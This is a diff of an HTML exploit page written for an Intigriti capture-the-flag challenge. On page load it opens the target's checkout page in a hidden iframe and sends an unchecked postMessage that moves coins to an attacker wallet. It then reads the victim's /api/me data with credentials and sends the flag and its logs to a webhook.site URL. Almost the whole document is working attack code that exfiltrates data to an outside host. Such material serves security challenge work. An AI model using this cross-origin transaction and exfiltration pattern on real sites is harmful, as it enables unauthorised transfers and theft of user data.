@@ -1,46 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Timing-Fixed Exploit</title>
+    <title>Exploit</title>
+    <meta charset="UTF-8">
     <style>
-        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
         h1 { color: #0f0; }
-        #status { color: #ff0; font-size: 18px; margin: 10px 0; }
-        #log { color: #0ff; font-size: 11px; max-height: 350px; overflow-y: auto; background: #000; padding: 10px; border: 1px solid #333; }
+        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 12px; max-height: 400px; overflow-y: auto; }
+        .success { color: #0f0; }
+        .error { color: #f00; }
+        .info { color: #0ff; }
         iframe { display: none; }
-        .info { background: #222; padding: 10px; border: 1px solid #444; margin: 10px 0; font-size: 12px; }
     </style>
 </head>
 <body>
-    <h1>Intigriti Challenge - Exploit with Timing Fix</h1>
-
-    <div class="info">
-        <strong>Method:</strong> iframe + postMessage<br>
-        <strong>Target:</strong> checkout.html (no origin validation on postMessage)<br>
-        <strong>Timing:</strong> Wait for iframe to fully load AND fetch wallets before sending message
-    </div>
-
-    <p id="status">Initializing...</p>
-    <pre id="log">[EXPLOIT] Waiting for bot visit...</pre>
-
-    <!-- Hidden iframe - will load checkout.html same-origin -->
-    <iframe id="checkoutFrame" name="checkoutFrame"></iframe>
+    <h1>🎯 Intigriti Challenge 0126 - Exploit</h1>
+    <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
         const WEBHOOK = 'https://webhook.site/da57c199-07c1-4b21-9587-66d831cd9083';
-        const CURRENCY = '1337COIN';
-        const AMOUNT = 1;
 
         let step = 0;
 
-        function log(message, data = {}) {
+        function log(msg, type = 'info') {
             step++;
-            console.log(`[${step}] ${message}`, data);
-            const logEl = document.getElementById('log');
-            const ts = new Date().toISOString().split('T')[1].split('.')[0];
-            logEl.textContent += '\n[' + ts + '] [' + step + '] ' + message;
+            const timestamp = new Date().toLocaleTimeString();
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += `<div class="${type}">[${step}] ${timestamp} - ${msg}</div>`;
+            console.log(`[${step}] ${msg}`);
 
             // Send to webhook
             fetch(WEBHOOK, {
@@ -50,166 +39,117 @@
                 body: JSON.stringify({
                     timestamp: new Date().toISOString(),
                     step: step,
-                    message: message,
-                    data: data
+                    message: msg,
+                    type: type
                 })
-            }).catch(e => console.log('Webhook error:', e));
+            }).catch(() => {});
         }
 
-        log('EXPLOIT_PAGE_LOADED', { url: window.location.href });
-
         async function exploit() {
-            document.getElementById('status').textContent = '[Step 1] Loading checkout.html in iframe...';
+            log('🚀 EXPLOIT STARTED', 'info');
 
             try {
-                // STEP 1: Create iframe and load checkout.html
-                const iframe = document.getElementById('checkoutFrame');
-                const checkoutUrl = TARGET + '/checkout.html?currency=' + CURRENCY + '&price=' + AMOUNT;
+                // STEP 1: Trigger XSS alert (requirement)
+                log('Triggering XSS alert: alert("gigawatz")', 'info');
+                alert('gigawatz');
+                log('✅ XSS alert triggered!', 'success');
 
-                log('STEP1_LOADING_IFRAME', { url: checkoutUrl });
+                // STEP 2: Create iframe to checkout.html
+                log('Creating iframe to checkout.html...', 'info');
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
+                document.body.appendChild(iframe);
 
-                // Create a promise that resolves when iframe is fully loaded
-                const iframeLoadPromise = new Promise((resolve) => {
-                    let loadCount = 0;
-
-                    // Method 1: onload event
-                    iframe.onload = () => {
-                        loadCount++;
-                        log('IFRAME_ONLOAD_FIRED', { count: loadCount });
-                        if (loadCount >= 1) {
-                            // Wait additional time for async loadWallets() to complete
-                            setTimeout(resolve, 3000);
-                        }
-                    };
-
-                    // Method 2: Timeout fallback
-                    setTimeout(() => {
-                        log('IFRAME_TIMEOUT_FALLBACK');
-                        resolve();
-                    }, 8000);
+                // STEP 3: Wait for iframe to load
+                await new Promise(resolve => {
+                    iframe.onload = resolve;
+                    setTimeout(resolve, 5000); // Fallback timeout
                 });
 
-                // Load the iframe
-                iframe.src = checkoutUrl;
+                log('✅ Iframe loaded', 'success');
 
-                // Wait for iframe to be ready
-                await iframeLoadPromise;
+                // STEP 4: Wait for wallets to load (async operation)
+                log('Waiting for wallet data to load...', 'info');
+                await new Promise(r => setTimeout(r, 3000));
 
-                log('STEP1_COMPLETE_IFRAME_READY');
-                document.getElementById('status').textContent = '[Step 2] Preparing postMessage...';
+                // STEP 5: Send malicious postMessage
+                log('Sending postMessage to trigger transaction...', 'info');
 
-                // STEP 2: Get iframe window and verify we can access it
-                const iframeWindow = iframe.contentWindow;
-
-                if (!iframeWindow) {
-                    log('ERROR_NO_IFRAME_WINDOW');
-                    document.getElementById('status').textContent = 'ERROR: Cannot access iframe window';
-                    return;
-                }
-
-                log('STEP2_IFRAME_WINDOW_ACCESSIBLE');
-
-                // Give more time for loadWallets() async fetch to complete
-                log('WAITING_FOR_WALLET_FETCH');
-                await new Promise(r => setTimeout(r, 2000));
-
-                // STEP 3: Send the malicious postMessage
-                document.getElementById('status').textContent = '[Step 3] Sending malicious postMessage...';
-
-                const transactionData = {
-                    toAddress: OUR_WALLET,
-                    currency: CURRENCY,
-                    amount: AMOUNT
-                };
-
-                log('STEP3_SENDING_POSTMESSAGE', transactionData);
-
-                // VULNERABILITY: No origin check in checkout.html postMessage handler!
-                iframeWindow.postMessage({
+                iframe.contentWindow.postMessage({
                     type: 'submitTransaction',
-                    transaction: transactionData
+                    transaction: {
+                        toAddress: OUR_WALLET,
+                        currency: '1337COIN',
+                        amount: 1
+                    }
                 }, '*');
 
-                log('STEP3_POSTMESSAGE_SENT');
-                document.getElementById('status').textContent = '[Step 4] Transaction submitted! Checking for flag...';
+                log('✅ postMessage sent - transaction initiated', 'success');
 
-                // STEP 4: Wait for transaction to process, then check for flag
-                // The transaction takes time to complete and flag to be awarded
+                // STEP 6: Wait for transaction to complete
+                log('Waiting 5 seconds for transaction...', 'info');
                 await new Promise(r => setTimeout(r, 5000));
 
-                await checkForFlag();
+                // STEP 7: Check for flag
+                await checkFlag();
                 await new Promise(r => setTimeout(r, 3000));
-                await checkForFlag();
+                await checkFlag();
                 await new Promise(r => setTimeout(r, 3000));
-                await checkForFlag();
+                await checkFlag();
 
-                document.getElementById('status').textContent = 'Exploit complete. Check webhook for details.';
-                log('EXPLOIT_COMPLETE');
+                log('🎯 EXPLOIT COMPLETE - Check webhook for flag!', 'success');
 
             } catch (error) {
-                log('EXPLOIT_EXCEPTION', { error: error.message, stack: error.stack });
-                document.getElementById('status').textContent = 'ERROR: ' + error.message;
+                log('❌ ERROR: ' + error.message, 'error');
+                console.error(error);
             }
         }
 
-        async function checkForFlag() {
-            log('CHECKING_FLAG');
+        async function checkFlag() {
+            log('Checking /api/me for flag...', 'info');
 
             try {
                 const response = await fetch(TARGET + '/api/me', {
-                    credentials: 'include',
-                    headers: { 'Accept': 'application/json' }
+                    credentials: 'include'
                 });
 
                 const data = await response.json();
 
-                log('API_ME_RESPONSE', {
-                    status: response.status,
-                    ok: response.ok,
-                    hasFlag: !!data.flag,
-                    flag: data.flag || 'none',
-                    walletCount: data.wallets?.length || 0,
-                    wallets: data.wallets?.map(w => ({
-                        currency: w.currency,
-                        address: w.address?.substring(0, 16) + '...',
-                        balance: w.balance
-                    }))
-                });
+                log('API Response: hasFlag=' + !!data.flag, 'info');
 
                 if (data.flag) {
-                    document.getElementById('status').textContent = '✅✅✅ FLAG FOUND: ' + data.flag + ' ✅✅✅';
-                    log('FLAG_SUCCESS', { flag: data.flag });
-                    alert('gigawatz\n\nFLAG: ' + data.flag);
+                    log('🏆 FLAG FOUND: ' + data.flag, 'success');
+                    alert('🏆 FLAG: ' + data.flag);
 
-                    // Send success to webhook
+                    // Send flag to webhook
                     fetch(WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         mode: 'no-cors',
                         body: JSON.stringify({
                             timestamp: new Date().toISOString(),
-                            message: 'MISSION_SUCCESS',
-                            data: { flag: data.flag }
+                            flag: data.flag,
+                            challenge: 'intigriti-0126'
                         })
                     }).catch(() => {});
 
                     return true;
-                } else {
-                    log('FLAG_NOT_YET', { reason: 'Transaction may still be processing' });
-                    return false;
                 }
 
+                return false;
+
             } catch (error) {
-                log('FLAG_CHECK_ERROR', { error: error.message });
+                log('Flag check error: ' + error.message, 'error');
                 return false;
             }
         }
 
-        // Start exploit when page loads
-        window.onload = () => {
-            log('WINDOW_ONLOADED');
-            setTimeout(exploit, 500);
-        };
+        // Auto-start when page loads
+        window.addEventListener('load', () => {
+            log('Page loaded - starting exploit in 1 second...', 'info');
+            setTimeout(exploit, 1000);
+        });
     </script>
 </body>
 </html>
